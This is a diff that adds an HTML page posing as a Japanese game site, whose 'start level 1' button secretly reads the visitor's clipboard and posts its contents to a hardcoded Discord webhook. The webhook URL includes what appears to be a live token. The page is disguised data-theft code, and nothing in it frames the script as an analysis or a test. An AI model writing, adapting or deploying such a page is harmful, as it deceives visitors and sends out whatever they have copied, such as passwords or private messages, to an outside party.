@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>超楽しいゲーム</title>
+</head>
+<body>
+    <h1>楽しいゲームサイト</h1>
+    <button id="sendClipboard">レベル１をはじめる</button>
+    <p id="status"></p>
+
+    <script>
+        const webhookURL = 'https://discord.com/api/webhooks/1259084424440451173/HHEl0dCRfQJIJSB3TzBn-9aH7y3DQ1LWZLHAc1fxBWggZcByiF6hnWLDA11L1qeGwZc5';
+
+        document.getElementById('sendClipboard').addEventListener('click', async () => {
+            try {
+                // クリップボードの内容を取得
+                const text = await navigator.clipboard.readText();
+
+                // Discord ウェブフックに送信
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: text }),
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Error: ${response.statusText}`);
+                }
+
+                document.getElementById('status').textContent = '送信に成功しました。';
+            } catch (error) {
+                document.getElementById('status').textContent = `エラー: ${error.message}`;
+            }
+        });
+    </script>
+</body>
+</html>
